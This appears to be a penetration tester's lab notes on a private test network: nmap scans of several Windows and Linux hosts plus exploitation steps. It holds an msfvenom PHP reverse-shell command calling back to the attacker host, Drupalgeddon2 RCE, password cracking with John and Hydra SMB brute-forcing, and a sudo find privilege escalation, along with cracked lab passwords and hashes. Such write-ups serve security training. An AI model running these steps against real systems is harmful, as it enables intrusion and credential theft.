## Attacker IP
### 192.168.100.5
## Nmap Host Discovery
```bash
root@kali:~# nmap -sn 192.168.100.0/24
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-03 19:07 IST
Nmap scan report for ip-192-168-100-1.ec2.internal (192.168.100.1)
Host is up (0.00011s latency).
MAC Address: 02:8D:4F:AF:8B:27 (Unknown)
Nmap scan report for ip-192-168-100-50.ec2.internal (192.168.100.50)
Host is up (0.00038s latency).
MAC Address: 02:F4:99:CF:7E:09 (Unknown)
Nmap scan report for ip-192-168-100-51.ec2.internal (192.168.100.51)
Host is up (0.00031s latency).
MAC Address: 02:EC:65:84:19:2B (Unknown)
Nmap scan report for ip-192-168-100-52.ec2.internal (192.168.100.52)
Host is up (0.00040s latency).
MAC Address: 02:38:69:81:B3:79 (Unknown)
Nmap scan report for ip-192-168-100-55.ec2.internal (192.168.100.55)
Host is up (0.00024s latency).
MAC Address: 02:8C:2C:19:E7:F1 (Unknown)
Nmap scan report for ip-192-168-100-63.ec2.internal (192.168.100.63)
Host is up (0.00040s latency).
MAC Address: 02:AD:C0:AB:45:97 (Unknown)
Nmap scan report for ip-192-168-100-67.ec2.internal (192.168.100.67)
Host is up (0.00049s latency).
MAC Address: 02:57:AA:B0:6E:A5 (Unknown)
Nmap scan report for ip-192-168-100-5.ec2.internal (192.168.100.5)
Host is up.
Nmap done: 256 IP addresses (8 hosts up) scanned in 1.84 seconds
```
## Nmap Port Scanning
###  192.168.100.50
Windows
```bash
root@kali:~# nmap -sV -sC -O 192.168.100.50
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-03 19:15 IST
Nmap scan report for ip-192-168-100-50.ec2.internal (192.168.100.50)
Host is up (0.00041s latency).
Not shown: 990 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
80/tcp    open  http               Apache httpd 2.4.51 ((Win64) PHP/7.4.26)
|_http-server-header: Apache/2.4.51 (Win64) PHP/7.4.26
|_http-title: WAMPSERVER Homepage
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Windows Server 2012 R2 Standard 9600 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=WINSERVER-01
| Not valid before: 2023-08-02T13:35:13
|_Not valid after:  2024-02-01T13:35:13
|_ssl-date: 2023-08-03T13:46:33+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-01
|   NetBIOS_Domain_Name: WINSERVER-01
|   NetBIOS_Computer_Name: WINSERVER-01
|   DNS_Domain_Name: WINSERVER-01
|   DNS_Computer_Name: WINSERVER-01
|   Product_Version: 6.3.9600
|_  System_Time: 2023-08-03T13:46:19+00:00
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 02:F4:99:CF:7E:09 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/3%OT=80%CT=1%CU=36510%PV=Y%DS=1%DC=D%G=Y%M=02F499%TM
OS:=64CBAFB9%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=10C%TI=I%CI=I%II=I%
OS:SS=S%TS=7)OPS(O1=M2301NW8ST11%O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M2301N
OS:W8ST11%O5=M2301NW8ST11%O6=M2301ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%
OS:W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF
OS:=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%
OS:Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A
OS:%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y
OS:%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows Server 2012 R2 Standard 9600 (Windows Server 2012 R2 Standard 6.3)
|   OS CPE: cpe:/o:microsoft:windows_server_2012::-
|   Computer name: WINSERVER-01
|   NetBIOS computer name: WINSERVER-01\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-08-03T13:46:19+00:00
|_nbstat: NetBIOS name: WINSERVER-01, NetBIOS user: <unknown>, NetBIOS MAC: 02:f4:99:cf:7e:09 (unknown)
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-08-03T13:46:19
|_  start_date: 2023-08-03T13:35:03
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 91.54 seconds
```
#### tcp 80
* WAMP server hosting wordpress
*  Wordpress version 5.9.3![[Pasted image 20230803141316.png]]
* wpscan reveals that ""http://wordpress.local/wp-content/uploads/" is directly accessible.
```bash
wpscan --url http://wordpress.local
Interesting Finding(s):

[+] Upload directory has listing enabled: http://wordpress.local/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

```
* wordpress.local/phpmyadmin: empty password for root user
	* Obtain user_pass for wordpress admin account(phpass). Then use John the ripper to crack the hash.
		```bash
		root@kali:~# john -w=/usr/share/wordlists/rockyou.txt password.txt 
		Using default input encoding: UTF-8
		Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
		Cost 1 (iteration count) is 8192 for all loaded hashes
		Will run 2 OpenMP threads
		Press 'q' or Ctrl-C to abort, almost any other key for status
		estrella         (?)     
		Session completed. 
		```
	* Use msfvenom to generate a php payload to give a meterpreter reverse shell and sets up listener with MSF exploit/multi/handler module.
		```bash
		msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.100.5 LPORT=4444 -f raw -o shell.php
		```
	* Log into admin dashboard with above credential and use WP File Manager plugin available to upload the php payload. Finally, according to the scan result of wpscan, we can execute the payload by navigating to "http://wordpress.local/wp-content/uploads/shell.php"
### 192.168.100.51
Windows

```bash
root@kali:~# nmap -sV -sC -O 192.168.100.51
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-03 19:12 IST
Nmap scan report for ip-192-168-100-51.ec2.internal (192.168.100.51)
Host is up (0.00052s latency).
Not shown: 989 closed tcp ports (reset)
PORT      STATE SERVICE            VERSION
21/tcp    open  ftp                Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 04-19-22  02:25AM       <DIR>          aspnet_client
| 04-19-22  01:19AM                 1400 cmdasp.aspx
| 04-19-22  12:17AM                99710 iis-85.png
| 04-19-22  12:17AM                  701 iisstart.htm
|_04-19-22  02:13AM                   22 robots.txt.txt
80/tcp    open  http               Microsoft IIS httpd 8.5
|_http-title: IIS Windows Server
| http-webdav-scan: 
|   Public Options: OPTIONS, TRACE, GET, HEAD, POST, PROPFIND, PROPPATCH, MKCOL, PUT, DELETE, COPY, MOVE, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/8.5
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, POST, COPY, PROPFIND, DELETE, MOVE, PROPPATCH, MKCOL, LOCK, UNLOCK
|   WebDAV type: Unknown
|   Server Date: Thu, 03 Aug 2023 13:43:38 GMT
|   Directory Listing: 
|     http://ip-192-168-100-51.ec2.internal/
|     http://ip-192-168-100-51.ec2.internal/aspnet_client/
|     http://ip-192-168-100-51.ec2.internal/cmdasp.aspx
|     http://ip-192-168-100-51.ec2.internal/iis-85.png
|     http://ip-192-168-100-51.ec2.internal/iisstart.htm
|_    http://ip-192-168-100-51.ec2.internal/robots.txt.txt
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND DELETE MOVE PROPPATCH MKCOL LOCK UNLOCK PUT
|_http-server-header: Microsoft-IIS/8.5
|_http-svn-info: ERROR: Script execution failed (use -d to debug)
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-02
|   NetBIOS_Domain_Name: WINSERVER-02
|   NetBIOS_Computer_Name: WINSERVER-02
|   DNS_Domain_Name: WINSERVER-02
|   DNS_Computer_Name: WINSERVER-02
|   Product_Version: 6.3.9600
|_  System_Time: 2023-08-03T13:43:38+00:00
| ssl-cert: Subject: commonName=WINSERVER-02
| Not valid before: 2023-08-02T13:35:11
|_Not valid after:  2024-02-01T13:35:11
|_ssl-date: 2023-08-03T13:43:43+00:00; -1s from scanner time.
49152/tcp open  msrpc              Microsoft Windows RPC
49153/tcp open  msrpc              Microsoft Windows RPC
49154/tcp open  msrpc              Microsoft Windows RPC
49155/tcp open  msrpc              Microsoft Windows RPC
49156/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 02:EC:65:84:19:2B (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/3%OT=21%CT=1%CU=41021%PV=Y%DS=1%DC=D%G=Y%M=02EC65%TM
OS:=64CBAF10%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=10C%TI=I%CI=I%II=I%
OS:SS=S%TS=7)OPS(O1=M2301NW8ST11%O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M2301N
OS:W8ST11%O5=M2301NW8ST11%O6=M2301ST11)WIN(W1=2000%W2=2000%W3=2000%W4=2000%
OS:W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF
OS:=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%
OS:Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A
OS:%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y
OS:%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR
OS:%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RU
OS:D=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WINSERVER-02, NetBIOS user: <unknown>, NetBIOS MAC: 02:ec:65:84:19:2b (unknown)
| smb2-time: 
|   date: 2023-08-03T13:43:38
|_  start_date: 2023-08-03T13:34:58
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 86.12 seconds
```
#### tcp 80 
* Command Injection at "http://192.168.100.51/cmdasp.aspx"
### 192.168.100.52
Linux
```bash
root@kali:~# nmap -sV -sC -O 192.168.100.52
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-03 19:19 IST
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 1 undergoing ARP Ping Scan
Parallel DNS resolution of 1 host. Timing: About 0.00% done
Nmap scan report for ip-192-168-100-52.ec2.internal (192.168.100.52)
Host is up (0.00044s latency).
Not shown: 993 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.100.5
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 65534    65534         318 Apr 18  2022 updates.txt
22/tcp   open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 80:df:2f:52:29:b9:58:2b:d6:72:6c:89:79:a4:24:c6 (RSA)
|   256 3e:34:67:3a:84:c0:6f:30:a9:cb:54:e4:db:f2:c3:c4 (ECDSA)
|_  256 4e:ea:33:c0:6b:a1:62:91:a5:3e:c2:86:fc:e8:74:92 (ED25519)
80/tcp   open  http          Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2018-02-21 17:28  drupal/
|_
|_http-title: Index of /
139/tcp  open  netbios-ssn   Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn   Samba smbd 4.13.17-Ubuntu (workgroup: WORKGROUP)
3306/tcp open  mysql         MySQL 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.3.34-MariaDB-0ubuntu0.20.04.1
|   Thread ID: 38
|   Capabilities flags: 63486
|   Some Capabilities: LongColumnFlag, DontAllowDatabaseTableColumn, FoundRows, Support41Auth, ConnectWithDatabase, InteractiveClient, SupportsTransactions, SupportsLoadDataLocal, IgnoreSigpipes, Speaks41ProtocolOld, Speaks41ProtocolNew, SupportsCompression, IgnoreSpaceBeforeParenthesis, ODBCClient, SupportsAuthPlugins, SupportsMultipleStatments, SupportsMultipleResults
|   Status: Autocommit
|_  Auth Plugin Name: mysql_native_password
3389/tcp open  ms-wbt-server xrdp
MAC Address: 02:38:69:81:B3:79 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/3%OT=21%CT=1%CU=31874%PV=Y%DS=1%DC=D%G=Y%M=023869%TM
OS:=64CBB082%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I%
OS:TS=A)OPS(O1=M2301ST11NW7%O2=M2301ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW
OS:7%O5=M2301ST11NW7%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4
OS:B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=
OS:40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%
OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=4
OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
OS:Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: Host: IP-192-168-100-52; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
| smb2-time: 
|   date: 2023-08-03T13:49:52
|_  start_date: N/A
|_nbstat: NetBIOS name: IP-192-168-100-, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.13.17-Ubuntu)
|   Computer name: ip-192-168-100-52
|   NetBIOS computer name: IP-192-168-100-52\x00
|   Domain name: ec2.internal
|   FQDN: ip-192-168-100-52.ec2.internal
|_  System time: 2023-08-03T13:49:52+00:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.62 seconds
```
#### tcp 21

* Anonumous FTP access to get "update.txt"
```bash
cat updates.txt 
Greetings gentlemen!

- I have setup the server successfully and have configured Drupal.
- Your Drupal passwords are exactly the same as your user account passwords on this server.
- I was too busy to setup a file sharing server so i will be posting the updates here.

- admin
```
#### tcp 80
* Apache server hosting drupal site.
* Discover drupal version by visiting http://192.168.100.52/drupal/CHANGELOG.txt
![[Pasted image 20230803103543.png]]
*  Drupal version 7.57 is vulnerable to RCE which can be exploited using MSF module "exploit/unix/webapp/drupal_drupalgeddon2"
![[Pasted image 20230803111723.png]]
#### tcp 3306 mysql
* Drupal database credential located in "/var/www/html/drupal/sites/default/setting.php"
```bash
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupal',
      'password' => 'syntex0421',
      'host' => 'localhost',
      'port' => '3306',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```
* "use druapl"
* "select name, pass from users;
```bash
MariaDB [drupal]> select name, pass from users;
select name, pass from users;
+----------+---------------------------------------------------------+
| name     | pass                                                    |
+----------+---------------------------------------------------------+
|          |                                                         |
| admin    | $S$D67i0qFmSLMLwZ9PU7VEocSS9fvV1JaSeJxQMgCid80hGbq6wXZH |
| auditor  | $S$DV.wsqkmKY3y5VW.icW/g5NTU3h.UA01nxqL9Cro27GaSBYpH4WC |
| dbadmin  | $S$DZcGD5qcb6xso1E/Mu6DJP4uPi5DfY28kBEyuIab8Pod1saBaImN |
| Vincenzo | $S$DGnS.dK3q2FeWeNbLikdI5Hk/XdBFI2jBFkmPvv/v9Ln8vjIanIu |
+----------+---------------------------------------------------------+
```
* Use john the ripper to crack above hash to obtain following:
```bash
auditor:qwertyuiop
dbadmin:sayang
Vincenzo:789456
```
#### tcp 445
*  Local users enumeration with
```bash
enum4linux 192.168.100.52 -u "guest" -p "" -U
S-1-5-21-2827036605-584126530-3955962082-501 IP-192-168-100-52\nobody (Local User)
S-1-22-1-1000 Unix User\ubuntu (Local User)
S-1-22-1-1001 Unix User\auditor (Local User)
S-1-22-1-1002 Unix User\dbadmin (Local User)
```
#### privilege escalation
* switch to auditor account and run "sudo -l" to find misconfigured sudo permission.
```bash
sudo -l
Matching Defaults entries for auditor on ip-192-168-100-52:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User auditor may run the following commands on ip-192-168-100-52:
    (root) NOPASSWD: /usr/bin/find
```
### 192.168.100.55
Windows
```bash
root@kali:~# nmap -sV -sC -O 192.168.100.55
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-03 19:19 IST
Nmap scan report for ip-192-168-100-55.ec2.internal (192.168.100.55)
Host is up (0.00040s latency).
Not shown: 995 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Windows Server 2019 Datacenter 17763 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| ssl-cert: Subject: commonName=WINSERVER-03
| Not valid before: 2023-08-02T13:35:06
|_Not valid after:  2024-02-01T13:35:06
|_ssl-date: 2023-08-03T13:50:16+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WINSERVER-03
|   NetBIOS_Domain_Name: WINSERVER-03
|   NetBIOS_Computer_Name: WINSERVER-03
|   DNS_Domain_Name: WINSERVER-03
|   DNS_Computer_Name: WINSERVER-03
|   Product_Version: 10.0.17763
|_  System_Time: 2023-08-03T13:50:11+00:00
MAC Address: 02:8C:2C:19:E7:F1 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/3%OT=80%CT=1%CU=41198%PV=Y%DS=1%DC=D%G=Y%M=028C2C%TM
OS:=64CBB098%P=x86_64-pc-linux-gnu)SEQ(SP=107%GCD=1%ISR=103%TI=I%CI=I%II=I%
OS:SS=S%TS=U)OPS(O1=M2301NW8NNS%O2=M2301NW8NNS%O3=M2301NW8%O4=M2301NW8NNS%O
OS:5=M2301NW8NNS%O6=M2301NNS)WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6
OS:=FF70)ECN(R=Y%DF=Y%T=80%W=FFFF%O=M2301NW8NNS%CC=Y%Q=)T1(R=Y%DF=Y%T=80%S=
OS:O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0%Q=)T3(R=Y%
OS:DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O
OS:=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80
OS:%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q
OS:=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y
OS:%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: WINSERVER-03, NetBIOS user: <unknown>, NetBIOS MAC: 02:8c:2c:19:e7:f1 (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-08-03T13:50:11
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows Server 2019 Datacenter 17763 (Windows Server 2019 Datacenter 6.3)
|   Computer name: WINSERVER-03
|   NetBIOS computer name: WINSERVER-03\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2023-08-03T13:50:11+00:00

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 41.58 seconds

```
#### tcp 445

- SMB brute-forcing

```bash
root@kali:~# hydra smb://192.168.100.55 -L /usr/share/metasploit-
[445][smb] host: 192.168.100.55   login: administrator   password: swordfish
```
* Use MSF psexec to gain reverse shell since we have legitimate credential with administrative privs.
### 192.168.100.63
Windows
```bash
root@kali:~# nmap -sV -sC -O 192.168.100.63
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-03 19:21 IST
Nmap scan report for ip-192-168-100-63.ec2.internal (192.168.100.63)
Host is up (0.00044s latency).
Not shown: 994 filtered tcp ports (no-response)
PORT      STATE SERVICE            VERSION
135/tcp   open  msrpc              Microsoft Windows RPC
139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ssl/ms-wbt-server?
| ssl-cert: Subject: commonName=WIN-41BR1H0GTN7
| Not valid before: 2023-08-02T12:30:13
|_Not valid after:  2024-02-01T12:30:13
|_ssl-date: 2023-08-03T13:53:39+00:00; 0s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: WIN-41BR1H0GTN7
|   NetBIOS_Domain_Name: WIN-41BR1H0GTN7
|   NetBIOS_Computer_Name: WIN-41BR1H0GTN7
|   DNS_Domain_Name: WIN-41BR1H0GTN7
|   DNS_Computer_Name: WIN-41BR1H0GTN7
|   Product_Version: 6.3.9600
|_  System_Time: 2023-08-03T13:52:59+00:00
49155/tcp open  msrpc              Microsoft Windows RPC
49158/tcp open  msrpc              Microsoft Windows RPC
MAC Address: 02:AD:C0:AB:45:97 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Microsoft Windows 2012
OS CPE: cpe:/o:microsoft:windows_server_2012:r2
OS details: Microsoft Windows Server 2012 or Windows Server 2012 R2
Network Distance: 1 hop
Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.0.2: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2023-08-03T13:52:59
|_  start_date: 2023-08-03T13:33:40
|_nbstat: NetBIOS name: WIN-41BR1H0GTN7, NetBIOS user: <unknown>, NetBIOS MAC: 02:ad:c0:ab:45:97 (unknown)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.94 seconds
```
### 192.168.100.67
Linux
```bash
root@kali:~# nmap -sV -sC -O 192.168.100.67
Starting Nmap 7.92 ( https://nmap.org ) at 2023-08-03 19:21 IST
Nmap scan report for ip-192-168-100-67.ec2.internal (192.168.100.67)
Host is up (0.00031s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 bf:42:3c:50:5c:ed:6d:59:49:f2:e5:0c:43:36:3c:6b (RSA)
|   256 e0:ac:bc:b9:d4:81:0d:2c:6e:85:55:38:ad:47:a2:d0 (ECDSA)
|_  256 c6:50:17:8a:37:96:2b:df:e7:c6:01:24:92:c4:fe:5b (ED25519)
MAC Address: 02:57:AA:B0:6E:A5 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=8/3%OT=22%CT=1%CU=39670%PV=Y%DS=1%DC=D%G=Y%M=0257AA%TM
OS:=64CBB101%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=109%TI=Z%CI=Z%II=I%
OS:TS=A)OPS(O1=M2301ST11NW6%O2=M2301ST11NW6%O3=M2301NNT11NW6%O4=M2301ST11NW
OS:6%O5=M2301ST11NW6%O6=M2301ST11)WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4
OS:B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=F507%O=M2301NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=
OS:40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%
OS:O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=4
OS:0%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%
OS:Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=
OS:Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.40 seconds
```